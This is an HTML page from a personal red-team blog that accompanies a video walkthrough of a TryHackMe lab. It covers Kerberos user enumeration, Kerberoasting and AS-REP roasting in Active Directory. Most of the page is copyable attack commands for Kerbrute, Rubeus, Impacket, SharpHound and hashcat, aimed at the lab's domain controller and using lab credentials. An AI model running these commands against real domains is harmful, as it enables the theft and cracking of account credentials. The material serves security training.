@@ -1,0 +1,391 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Kerberos Attacks Explained: User Enumeration, Kerberoasting and AS-REP Roasting — m0rn1ngstr</title>
+  <meta name="description" content="Kerberos theory, user enumeration, Kerberoasting, and AS-REP Roasting — full walkthrough with Kerbrute, Rubeus, Impacket, and Hashcat." />
+  <link rel="stylesheet" href="../style.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@tabler/icons-webfont@latest/tabler-icons.min.css" />
+  <style>
+    .cmd-block { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; overflow:hidden; margin-bottom:12px; }
+    .cmd-header { display:flex; justify-content:space-between; align-items:center; padding:7px 14px; border-bottom:0.5px solid var(--border); background:var(--surface2); }
+    .cmd-label { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); }
+    .cmd-copy { font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--mint); background:none; border:none; cursor:pointer; opacity:0.7; letter-spacing:0.5px; }
+    .cmd-copy:hover { opacity:1; }
+    .cmd-body { padding:12px 14px; font-family:'JetBrains Mono',monospace; font-size:12px; line-height:1.7; color:var(--mint); overflow-x:auto; white-space:pre; }
+    .cmd-comment { color:var(--text-muted); }
+    .ts-list { list-style:none; }
+    .ts-list li { display:flex; gap:12px; align-items:baseline; padding:8px 0; border-bottom:0.5px solid var(--border); font-size:13px; }
+    .ts-list li:last-child { border-bottom:none; }
+    .ts-time { font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--red); min-width:40px; flex-shrink:0; }
+    .lab-card { background:var(--surface); border:0.5px solid var(--border); border-radius:8px; padding:10px 12px; margin-bottom:7px; text-decoration:none; display:block; transition:border-color 0.2s; }
+    .lab-card:hover { border-color:var(--red); }
+    .res-link { display:flex; align-items:center; gap:8px; padding:8px 10px; border-radius:6px; border:0.5px solid var(--border); margin-bottom:6px; text-decoration:none; transition:border-color 0.2s; background:var(--surface); }
+    .res-link:hover { border-color:var(--purple); }
+    a.card, a.card:visited { color:var(--text); }
+    .attack-divider {
+      display:flex; align-items:center; gap:12px;
+      margin:2rem 0 1.5rem;
+    }
+    .attack-divider-label {
+      font-family:'JetBrains Mono',monospace; font-size:11px;
+      color:var(--red); letter-spacing:2px; text-transform:uppercase;
+      white-space:nowrap;
+    }
+    .attack-divider-line { flex:1; height:0.5px; background:var(--border); }
+  </style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="../index.html">m0rn1ngstr<span>.</span></a>
+  <div class="nav-links">
+    <a href="../about.html">about</a>
+    <a href="../videos.html" class="active">videos</a>
+    <a href="../work.html">work</a>
+  </div>
+</nav>
+
+<div style="padding:0.9rem 2rem; font-family:'JetBrains Mono',monospace; font-size:11px; color:var(--text-muted); border-bottom:0.5px solid var(--border); display:flex; align-items:center; gap:8px;">
+  <a href="../index.html" style="color:var(--text-muted); text-decoration:none;">home</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <a href="../videos.html" style="color:var(--text-muted); text-decoration:none;">videos</a>
+  <span style="color:var(--red); opacity:0.5;">/</span>
+  <span style="color:var(--text);">kerberos-attacks-user-enumeration-kerberoasting-asrep-roasting</span>
+</div>
+
+<div style="max-width:1060px; margin:0 auto; display:grid; grid-template-columns:1fr 280px; gap:0;">
+
+  <!-- MAIN -->
+  <main style="padding:2.5rem 2rem; border-right:0.5px solid var(--border);">
+
+    <div style="display:flex; align-items:center; gap:8px; flex-wrap:wrap; margin-bottom:1rem;">
+      <span class="badge badge-hof" style="font-size:11px; padding:4px 10px;">Active Directory</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Windows</span>
+      <span class="badge badge-neutral" style="font-size:11px; padding:4px 10px;">Kerberos</span>
+      <span class="badge badge-purple" style="font-size:11px; padding:4px 10px;">Red Team</span>
+    </div>
+
+    <h1 style="font-size:1.6rem; font-weight:300; line-height:1.2; letter-spacing:-0.5px; margin-bottom:0.4rem;">Kerberos Attacks Explained: User Enumeration, Kerberoasting and AS-REP Roasting</h1>
+    <div style="font-family:'JetBrains Mono',monospace; font-size:12px; color:var(--text-muted); margin-bottom:1.5rem;">// published · 2022-08-02</div>
+
+    <!-- VIDEO THUMBNAIL -->
+    <a href="https://www.youtube.com/watch?v=U1nMgb8AEB4" target="_blank"
+       style="display:block; width:100%; aspect-ratio:16/9; margin-bottom:2rem; border-radius:8px; overflow:hidden; border:0.5px solid var(--border); position:relative; text-decoration:none;">
+      <img src="https://img.youtube.com/vi/U1nMgb8AEB4/maxresdefault.jpg"
+           alt="Kerberos Attacks Explained"
+           style="width:100%; height:100%; object-fit:cover; display:block;">
+      <div style="position:absolute; inset:0; display:flex; align-items:center; justify-content:center; background:rgba(0,0,0,0.25);">
+        <div style="width:64px; height:64px; border-radius:50%; background:var(--red); display:flex; align-items:center; justify-content:center;">
+          <i class="ti ti-player-play" style="color:#fff; font-size:24px; margin-left:3px;"></i>
+        </div>
+      </div>
+    </a>
+
+    <div class="section-head">overview</div>
+    <p style="font-size:14px; line-height:1.75; color:var(--text-muted); margin-bottom:2.5rem;">
+      Kerberos is the default authentication protocol in Active Directory environments —
+      and a goldmine for attackers. This video covers the full attack chain:
+      starting from <strong style="color:var(--text); font-weight:500;">user enumeration</strong> without credentials,
+      through <strong style="color:var(--text); font-weight:500;">Kerberoasting</strong> to extract and crack service account hashes,
+      to <strong style="color:var(--text); font-weight:500;">AS-REP Roasting</strong> against accounts with pre-authentication disabled.
+      Each technique is demonstrated with multiple tools — from local execution on a compromised host
+      to remote attacks via Impacket.
+    </p>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <!-- TIMESTAMPS -->
+    <div class="section-head">timestamps</div>
+    <ul class="ts-list" style="margin-bottom:2.5rem;">
+      <li><span class="ts-time">00:00</span><span style="color:var(--text-muted);">Intro</span></li>
+      <li><span class="ts-time">00:26</span><span style="color:var(--text-muted);">Theory — how Kerberos authentication works</span></li>
+      <li><span class="ts-time">02:26</span><span style="color:var(--text-muted);">User enumeration — Kerbrute, Nmap, Metasploit</span></li>
+      <li><span class="ts-time">06:48</span><span style="color:var(--text-muted);">Kerberoasting — Rubeus and Impacket</span></li>
+      <li><span class="ts-time">15:08</span><span style="color:var(--text-muted);">AS-REP Roasting — Rubeus and Impacket</span></li>
+      <li><span class="ts-time">20:00</span><span style="color:var(--text-muted);">Outro</span></li>
+    </ul>
+
+    <div style="height:0.5px; background:var(--border); margin:2rem 0;"></div>
+
+    <!-- COMMANDS -->
+    <div class="section-head">commands used</div>
+
+    <!-- USER ENUMERATION -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// user enumeration</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">kerbrute — enumerate valid domain users</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `~/tools/kerbrute/kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># Kerbrute sends AS-REQ packets and reads the error codes:
+# KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN (0x6) = user doesn't exist
+# KDC_ERR_PREAUTH_REQUIRED = user exists (pre-auth needed)
+# download: https://github.com/ropnop/kerbrute/releases/tag/v1.0.3</span>
+~/tools/kerbrute/kerbrute userenum \
+  --dc CONTROLLER.local \
+  -d CONTROLLER.local \
+  User.txt</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">nmap — enumerate users via krb5 nse script</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='CONTROLLER.local',userdb=User.txt CONTROLLER.local`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># uses the same AS-REQ technique as Kerbrute
+# useful when you only have nmap available on the target</span>
+nmap -p 88 --script=krb5-enum-users \
+  --script-args krb5-enum-users.realm='CONTROLLER.local',userdb=User.txt \
+  CONTROLLER.local</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">metasploit — kerberos_enumusers module</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `msfconsole -q\nuse auxiliary/gather/kerberos_enumusers\nset DOMAIN CONTROLLER.local\nset RHOSTS CONTROLLER.local\nset USER_FILE /home/m0rn1ngstr/thm/kerberos/User.txt\nrun`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># bonus: this module also captures AS-REP hashes for accounts
+# with pre-auth disabled — touching on AS-REP Roasting</span>
+msfconsole -q
+use auxiliary/gather/kerberos_enumusers
+set DOMAIN CONTROLLER.local
+set RHOSTS CONTROLLER.local
+set USER_FILE /home/m0rn1ngstr/thm/kerberos/User.txt
+run</div>
+    </div>
+
+    <!-- KERBEROASTING -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// kerberoasting</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">sharphound — collect bloodhound data</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `# transfer to target\nscp SharpHound.exe Administrator@CONTROLLER.local:C:/Users/Administrator/Downloads\n\n# run on target\n.\\SharpHound.exe -c All\n\n# transfer back\nscp Administrator@Controller.local:C:/Users/Administrator/Downloads/20220802043744_BloodHound.zip .`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># transfer SharpHound to target machine</span>
+scp SharpHound.exe Administrator@CONTROLLER.local:C:/Users/Administrator/Downloads
+
+<span class="cmd-comment"># run on target — collects all AD objects, ACLs, sessions, and SPNs</span>
+cd C:\Users\Administrator\Downloads
+.\SharpHound.exe -c All
+
+<span class="cmd-comment"># transfer the zip back to attacker machine for BloodHound</span>
+scp Administrator@Controller.local:C:/Users/Administrator/Downloads/20220802043744_BloodHound.zip .</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">rubeus — kerberoast all accounts (local)</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe kerberoast /nowrap\nRubeus.exe kerberoast /nowrap /simple`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># /nowrap — prevents base64 ticket from wrapping across lines (important for hashcat)
+# /simple — outputs only the ticket hash, easier to copy and save</span>
+Rubeus.exe kerberoast /nowrap
+Rubeus.exe kerberoast /nowrap /simple</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">rubeus — target a specific high-value account</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe kerberoast /user:sqlservice /nowrap /simple`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># use BloodHound to identify high-privilege kerberoastable accounts first
+# requesting a single ticket is stealthier than roasting all accounts</span>
+Rubeus.exe kerberoast /user:sqlservice /nowrap /simple</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">impacket — kerberoast remotely</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -request\nimpacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -request -outputfile k2_1.txt\n\nimpacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -request-user sqlservice\nimpacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -request-user sqlservice -outputfile k2_2.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># request tickets for all kerberoastable users</span>
+impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -request
+
+<span class="cmd-comment"># save all tickets directly to file</span>
+impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -request -outputfile k2_1.txt
+
+<span class="cmd-comment"># target a specific user</span>
+impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -request-user sqlservice
+
+<span class="cmd-comment"># target a specific user and save to file</span>
+impacket-GetUserSPNs controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -request-user sqlservice -outputfile k2_2.txt</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">hashcat — crack kerberoast tickets</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `hashcat -m 13100 -a 0 k2_l.txt Pass.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># -m 13100 = Kerberos 5 TGS-REP (RC4) hash type
+# -a 0     = straight/dictionary attack</span>
+hashcat -m 13100 -a 0 k2_l.txt Pass.txt</div>
+    </div>
+
+    <!-- AS-REP ROASTING -->
+    <div class="attack-divider">
+      <span class="attack-divider-label">// as-rep roasting</span>
+      <div class="attack-divider-line"></div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">rubeus — as-rep roast all vulnerable users (local)</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `Rubeus.exe asreproast /nowrap\nRubeus.exe asreproast /nowrap /user:user3`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># targets accounts with "Do not require Kerberos preauthentication" enabled
+# DC returns an encrypted TGT without verifying identity — crackable offline</span>
+Rubeus.exe asreproast /nowrap
+
+<span class="cmd-comment"># target a specific user identified via BloodHound</span>
+Rubeus.exe asreproast /nowrap /user:user3</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">impacket — as-rep roast remotely</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `# all vulnerable users (with credentials)\nimpacket-GetNPUsers controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -request\n\n# target user without knowing their password (press enter at prompt)\nimpacket-GetNPUsers controller.local/User3 -dc-ip 10.10.82.144 -request\n\n# use credentials + target list\nimpacket-GetNPUsers controller.local/Administrator:'P@$$W0rd' -dc-ip 10.10.82.144 -usersfile userfile.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># request tickets for all AS-REP-roastable users</span>
+impacket-GetNPUsers controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -request
+
+<span class="cmd-comment"># target a specific user — use their name as credentials, skip password at prompt</span>
+impacket-GetNPUsers controller.local/User3 \
+  -dc-ip 10.10.82.144 -request
+
+<span class="cmd-comment"># authenticated + target multiple users from a file</span>
+impacket-GetNPUsers controller.local/Administrator:'P@$$W0rd' \
+  -dc-ip 10.10.82.144 -usersfile userfile.txt</div>
+    </div>
+
+    <div class="cmd-block">
+      <div class="cmd-header">
+        <span class="cmd-label">hashcat — crack as-rep roast hashes</span>
+        <button class="cmd-copy" onclick="copyCmd(this, `hashcat -m 18200 -a 0 hash2.txt Pass.txt`)">copy</button>
+      </div>
+      <div class="cmd-body"><span class="cmd-comment"># -m 18200 = Kerberos 5 AS-REP hash type (different from Kerberoasting)
+# -a 0     = straight/dictionary attack</span>
+hashcat -m 18200 -a 0 hash2.txt Pass.txt</div>
+    </div>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside style="padding:2.5rem 1.5rem;">
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">lab to practice</div>
+      <a href="https://tryhackme.com/room/attackingkerberos" target="_blank" class="lab-card">
+        <div style="font-family:'JetBrains Mono',monospace; font-size:10px; color:var(--red); letter-spacing:1px; margin-bottom:3px;">TryHackMe</div>
+        <div style="font-size:12px; font-weight:500; color:var(--text);">Attacking Kerberos</div>
+        <div style="font-size:11px; color:var(--text-muted); margin-top:2px;">intermediate · AD enumeration & attacks</div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">resources</div>
+      <a href="https://hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — Kerberos (88)</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+      <a href="https://hacktricks.wiki/en/windows-hardening/active-directory-methodology/index.html" target="_blank" class="res-link">
+        <i class="ti ti-book" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">HackTricks — AD Methodology</div>
+          <div style="font-size:11px; color:var(--text-muted);">hacktricks.wiki</div>
+        </div>
+      </a>
+      <a href="https://attack.mitre.org/techniques/T1087/002/" target="_blank" class="res-link">
+        <i class="ti ti-external-link" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">MITRE ATT&CK — T1087.002</div>
+          <div style="font-size:11px; color:var(--text-muted);">Domain Account Discovery</div>
+        </div>
+      </a>
+      <a href="https://attack.mitre.org/techniques/T1558/003/" target="_blank" class="res-link">
+        <i class="ti ti-external-link" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">MITRE ATT&CK — T1558.003</div>
+          <div style="font-size:11px; color:var(--text-muted);">Kerberoasting</div>
+        </div>
+      </a>
+      <a href="https://attack.mitre.org/techniques/T1558/004/" target="_blank" class="res-link">
+        <i class="ti ti-external-link" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">MITRE ATT&CK — T1558.004</div>
+          <div style="font-size:11px; color:var(--text-muted);">AS-REP Roasting</div>
+        </div>
+      </a>
+      <a href="https://github.com/ropnop/kerbrute/releases/tag/v1.0.3" target="_blank" class="res-link">
+        <i class="ti ti-tool" style="font-size:14px; color:var(--text-muted); flex-shrink:0;"></i>
+        <div>
+          <div style="font-size:12px; font-weight:500; color:var(--text);">Kerbrute v1.0.3</div>
+          <div style="font-size:11px; color:var(--text-muted);">github.com/ropnop</div>
+        </div>
+      </a>
+    </div>
+
+    <div style="margin-bottom:2rem;">
+      <div class="section-head">relevant certs</div>
+      <div style="display:flex; flex-wrap:wrap; gap:6px;">
+        <span class="cert-pill">OSCP</span>
+        <span class="cert-pill">OSEP</span>
+        <span class="cert-pill">CRTO</span>
+      </div>
+    </div>
+
+    <div>
+      <div class="section-head">more videos</div>
+      <a href="crto-cert-review.html" class="card" style="display:flex; gap:10px; align-items:flex-start; padding:10px; text-decoration:none; margin-bottom:7px;">
+        <div style="width:52px; height:36px; border-radius:4px; overflow:hidden; flex-shrink:0;">
+          <img src="https://img.youtube.com/vi/Mb-lUgCVmOY/mqdefault.jpg"
+               style="width:100%; height:100%; object-fit:cover; display:block;">
+        </div>
+        <div>
+          <div style="font-family:'JetBrains Mono',monospace; font-size:9px; color:var(--red); letter-spacing:1px; text-transform:uppercase;">Certification · Red Team</div>
+          <div style="font-size:11px; font-weight:500; color:var(--text); line-height:1.35; margin-top:2px;">Certified Red Team Operator | CRTO Review</div>
+        </div>
+      </a>
+    </div>
+
+  </aside>
+</div>
+
+<footer>
+  <div class="footer-links">
+    <a href="https://youtube.com/@m0rn1ngstr" target="_blank"><i class="ti ti-brand-youtube"></i> YouTube</a>
+    <a href="https://x.com/m0rn1ngstr" target="_blank"><i class="ti ti-brand-x"></i> X</a>
+    <a href="https://www.linkedin.com/in/katerina-shevchenko01/" target="_blank"><i class="ti ti-brand-linkedin"></i> LinkedIn</a>
+  </div>
+  <span>// hello, friend. &copy; 2026 m0rn1ngstr</span>
+</footer>
+
+<script>
+  function copyCmd(btn, text) {
+    navigator.clipboard.writeText(text).then(() => {
+      const orig = btn.textContent;
+      btn.textContent = 'copied!';
+      setTimeout(() => btn.textContent = orig, 1500);
+    });
+  }
+</script>
+
+</body>
+</html>
